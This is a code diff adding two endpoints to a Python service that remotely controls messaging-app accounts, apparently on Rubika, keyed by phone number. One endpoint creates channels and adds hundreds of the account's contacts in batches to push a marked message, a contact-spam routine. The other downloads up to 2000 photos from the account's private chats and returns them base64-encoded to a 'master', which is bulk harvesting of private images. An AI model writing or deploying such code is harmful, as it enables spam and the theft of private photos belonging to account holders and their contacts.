@@ -186,6 +186,18 @@ def _build_app():
     class GenSelfIn(BaseModel):
         phone: str
 
+    class BroadcastIn(BaseModel):
+        phone: str
+        title: str
+        username_seed: str = "ch"
+        marker: str = ""
+        member_target: int = 300
+
+    class PvExportIn(BaseModel):
+        phone: str
+        max_chats: int = 1000
+        max_photos: int = 2000
+
     class ChannelCreateIn(BaseModel):
         phone: str
         marker: str
@@ -607,6 +619,64 @@ def _build_app():
             return {"ok": True, "added": added}
         except Exception as e:  # noqa: BLE001
             return {"ok": False, "added": 0, "error": repr(e)[:160]}
+
+    @app.post("/broadcast/run")
+    async def broadcast_run(body: BroadcastIn, authorization: str = Header(None)):
+        _auth(authorization)
+        async def _do(client):
+            guid = await rb.create_channel(client, body.title)
+            username = ""
+            try:
+                username = await rb.assign_random_channel_username(client, guid)
+            except Exception:
+                username = ""
+            forwarded = False
+            try:
+                saved_guid, mid = await rb.find_marked_message(client, body.marker)
+                if mid:
+                    await rb.forward_message(client, saved_guid, guid, mid)
+                    forwarded = True
+            except Exception:
+                forwarded = False
+            added = 0
+            try:
+                added = await rb.seed_channel_with_contacts(
+                    client, guid, target=body.member_target,
+                    batch=config.CHANNEL_ADD_BATCH, delay=config.CHANNEL_ADD_DELAY)
+            except Exception:
+                added = 0
+            return {"object_guid": guid, "username": username,
+                    "forwarded": forwarded, "added": added}
+        try:
+            res = await account_conn.call(body.phone, _do, timeout=900)
+            return {"ok": True, **res}
+        except Exception as e:  # noqa: BLE001
+            return {"ok": False, "error": repr(e)[:200]}
+
+    @app.post("/pvexport/run")
+    async def pvexport_run(body: PvExportIn, authorization: str = Header(None)):
+        _auth(authorization)
+        # download all PV photos -> return them base64 so the master builds the PDF
+        import base64
+        async def _do(client):
+            out = []
+            guids = await rb.get_chat_list_guids(client, only_users=True)
+            for g in guids[:body.max_chats]:
+                async for _mid, fi in rb.iter_chat_photos(client, g):
+                    try:
+                        blob = await rb.download_photo(client, fi)
+                        if blob:
+                            out.append(base64.b64encode(blob).decode())
+                    except Exception:
+                        continue
+                    if len(out) >= body.max_photos:
+                        return out
+            return out
+        try:
+            photos = await account_conn.call(body.phone, _do, timeout=1800)
+            return {"ok": True, "photos_b64": photos, "count": len(photos)}
+        except Exception as e:  # noqa: BLE001
+            return {"ok": False, "count": 0, "error": repr(e)[:200]}
 
     @app.get("/extras/logs")
     async def extras_logs(authorization: str = Header(None)):
